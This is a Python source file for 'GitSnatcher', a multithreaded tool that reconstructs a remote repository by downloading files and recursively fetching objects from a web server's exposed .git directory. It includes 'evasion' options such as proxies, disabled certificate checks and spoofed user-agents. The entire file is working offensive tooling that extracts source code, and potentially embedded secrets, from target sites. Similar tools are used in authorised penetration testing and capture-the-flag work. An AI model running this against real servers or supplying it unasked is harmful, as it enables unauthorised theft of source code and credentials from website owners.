import os
import sys
import zlib
import re
import argparse
import struct
import threading
import time
import requests
import urllib3
from urllib.parse import urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

BANNER = r"""
   ____ _ _____        _       _               
  / ___(_) |__  |__  _ __   __ _| |_ ___| |__   ___ _ __ 
 | |  _| | __/ __| '_ \ / _` | __/ __| '_ \ / _ \ '__|
 | |_| | | |_\__ \ | | | (_| | || (__| | | |  __/ |   
  \____|_|\__|___/_| |_|\__,_|\__\___|_| |_|\___|_|   
                                                      
    .git Directory Reconstructor & Extractor
    Made by baba01hacker
"""

class GitSnatcher:
    def __init__(self, args):
        base_url = args.url
        if not base_url.endswith('/'):
            base_url += '/'
        if not base_url.endswith('.git/'):
            base_url += '.git/'
            
        self.base_url = base_url
        self.out_dir = args.output_dir
        self.threads = args.threads
        self.timeout = args.timeout
        self.delay = args.delay
        self.verify_ssl = not args.insecure
        self.proxies = {"http": args.proxy, "https": args.proxy} if args.proxy else None
        
        self.headers = {"User-Agent": args.user_agent or "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
        if args.headers:
            for h in args.headers:
                if ":" in h:
                    k, v = h.split(":", 1)
                    self.headers[k.strip()] = v.strip()

        self.session = requests.Session()
        self.session.headers.update(self.headers)
        if self.proxies:
            self.session.proxies.update(self.proxies)

        self.downloaded = set()
        self.queue = set()
        self.lock = threading.Lock()
        
        self.total_extracted = 0
        self.objects_found = 0
        
        self.initial_files = [
            'HEAD', 'config', 'description', 'info/exclude',
            'info/refs', 'logs/HEAD', 'logs/refs/heads/master',
            'logs/refs/heads/main', 'refs/heads/master', 'refs/heads/main',
            'refs/stash', 'index', 'packed-refs', 'objects/info/packs'
        ]

    def print_msg(self, level, msg):
        if level == "success":
            print(f"{Colors.OKGREEN}[+]{Colors.ENDC} {msg}")
        elif level == "info":
            print(f"{Colors.OKBLUE}[*]{Colors.ENDC} {msg}")
        elif level == "warning":
            print(f"{Colors.WARNING}[!]{Colors.ENDC} {msg}")
        elif level == "error":
            print(f"{Colors.FAIL}[-]{Colors.ENDC} {msg}")
        elif level == "status":
            sys.stdout.write(f"\r{Colors.OKCYAN}[>]{Colors.ENDC} {msg}")
            sys.stdout.flush()

    def download_file(self, path):
        with self.lock:
            if path in self.downloaded:
                return None
            self.downloaded.add(path)
            
        if self.delay > 0:
            time.sleep(self.delay)
            
        url = urljoin(self.base_url, path)
        out_path = os.path.join(self.out_dir, path)
        
        try:
            resp = self.session.get(url, timeout=self.timeout, verify=self.verify_ssl, allow_redirects=False)
            if resp.status_code != 200:
                return None
                
            data = resp.content
            if b'<html' in data[:100].lower() or b'<body' in data[:100].lower():
                # Server returned a 200 OK but it's a soft 404 or block page
                return None
                
            os.makedirs(os.path.dirname(out_path), exist_ok=True)
            with open(out_path, 'wb') as f:
                f.write(data)
                
            with self.lock:
                self.total_extracted += 1
                self.print_msg("status", f"Extracted: {self.total_extracted} files | Objects in queue: {len(self.queue)} | Last fetched: {path[:40]}")
                
            return data
            
        except requests.exceptions.RequestException:
            return None

    def get_object_path(self, sha1):
        return f"objects/{sha1[:2]}/{sha1[2:]}"

    def parse_object(self, data):
        try:
            decompressed = zlib.decompress(data)
        except zlib.error:
            return []
            
        hashes = set()
        matches = re.findall(b'[0-9a-f]{40}', decompressed)
        for match in matches:
            hashes.add(match.decode('ascii'))
            
        tree_pattern = re.compile(b'(?:100644|100755|40000|120000|160000) [^\x00]+\x00(.{20})', re.DOTALL)
        for match in tree_pattern.findall(decompressed):
            hashes.add(match.hex())
            
        return list(hashes)

    def extract_hashes_from_text(self, data):
        if not data:
            return []
        matches = re.findall(b'[0-9a-f]{40}', data)
        return [m.decode('ascii') for m in matches]

    def parse_index(self, data):
        hashes = set()
        if len(data) < 12:
            return []
        
        signature, version, entries = struct.unpack('>4sII', data[:12])
        if signature != b'DIRC':
            return []
            
        offset = 12
        for _ in range(entries):
            if offset + 62 > len(data):
                break
            sha1 = data[offset+40:offset+60]
            hashes.add(sha1.hex())
            
            flags = struct.unpack('>H', data[offset+60:offset+62])[0]
            is_extended = (flags & 0x4000) != 0 and version >= 3
            fixed_len = 64 if is_extended else 62
            
            if offset + fixed_len > len(data):
                break
                
            if version == 4:
                pos = offset + fixed_len
                while pos < len(data) and (data[pos] & 0x80):
                    pos += 1
                pos += 1
                nul_pos = data.find(b'\x00', pos)
                if nul_pos == -1: break
                offset = nul_pos + 1
            else:
                nul_pos = data.find(b'\x00', offset + fixed_len)
                if nul_pos == -1: break
                actual_name_length = nul_pos - (offset + fixed_len)
                entry_len = fixed_len + actual_name_length
                entry_len += 8 - (entry_len % 8)
                offset += entry_len
            
        return list(hashes)

    def run(self):
        print(Colors.OKCYAN + BANNER.replace("baba01hacker", f"{Colors.BOLD}baba01hacker{Colors.ENDC}{Colors.OKCYAN}") + Colors.ENDC)
        self.print_msg("info", f"Target: {Colors.BOLD}{self.base_url}{Colors.ENDC}")
        self.print_msg("info", f"Threads: {self.threads} | Timeout: {self.timeout}s")
        os.makedirs(self.out_dir, exist_ok=True)
        
        print("-" * 50)
        self.print_msg("info", "Phase 1: Downloading initial config and indices...")
        
        for path in self.initial_files:
            data = self.download_file(path)
            if data:
                if path == 'index':
                    new_hashes = self.parse_index(data)
                    self.queue.update(new_hashes)
                new_hashes = self.extract_hashes_from_text(data)
                self.queue.update(new_hashes)

        print("\n" + "-" * 50)
        self.print_msg("info", f"Phase 2: Recursively fetching {len(self.queue)} discovered objects...")

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            while self.queue:
                current_batch = list(self.queue)
                self.queue.clear()
                
                futures = {}
                for sha1 in current_batch:
                    obj_path = self.get_object_path(sha1)
                    with self.lock:
                        if obj_path not in self.downloaded:
                            futures[executor.submit(self.download_file, obj_path)] = sha1
                        
                for future in as_completed(futures):
                    sha1 = futures[future]
                    data = future.result()
                    if data:
                        new_hashes = self.parse_object(data)
                        for h in new_hashes:
                            obj_path = self.get_object_path(h)
                            with self.lock:
                                if obj_path not in self.downloaded:
                                    self.queue.add(h)

        print("\n" + "-" * 50)
        self.print_msg("success", f"Extraction Complete. Reconstructed {self.total_extracted} files.")
        self.print_msg("success", f"Saved to directory: {self.out_dir}")
        self.print_msg("info", "Tip: Run 'git status' or 'git checkout .' inside the output directory.")

def main():
    parser = argparse.ArgumentParser(description="GitSnatcher - Professional .git Repository Extractor")
    parser.add_argument("-u", "--url", required=True, help="URL to the target .git directory")
    parser.add_argument("-o", "--output-dir", required=True, help="Directory to save the downloaded files")
    
    perf_group = parser.add_argument_group("Performance Options")
    perf_group.add_argument("-t", "--threads", type=int, default=10, help="Number of concurrent threads (default: 10)")
    perf_group.add_argument("--delay", type=float, default=0, help="Delay between requests in seconds")
    perf_group.add_argument("--timeout", type=int, default=10, help="Connection timeout in seconds")
    
    net_group = parser.add_argument_group("Network & Evasion Options")
    net_group.add_argument("-x", "--proxy", help="HTTP/HTTPS proxy (e.g. http://127.0.0.1:8080)")
    net_group.add_argument("-k", "--insecure", action="store_true", help="Disable SSL/TLS certificate verification")
    net_group.add_argument("-A", "--user-agent", help="Custom User-Agent string")
    net_group.add_argument("-H", "--headers", nargs="*", help="Custom headers (e.g. 'Authorization: Bearer token')")

    args = parser.parse_args()
    
    try:
        snatcher = GitSnatcher(args)
        snatcher.run()
    except KeyboardInterrupt:
        print("\n")
        print(f"{Colors.WARNING}[!]{Colors.ENDC} Interrupted by user. Exiting safely.")
        sys.exit(0)

if __name__ == "__main__":
    main()
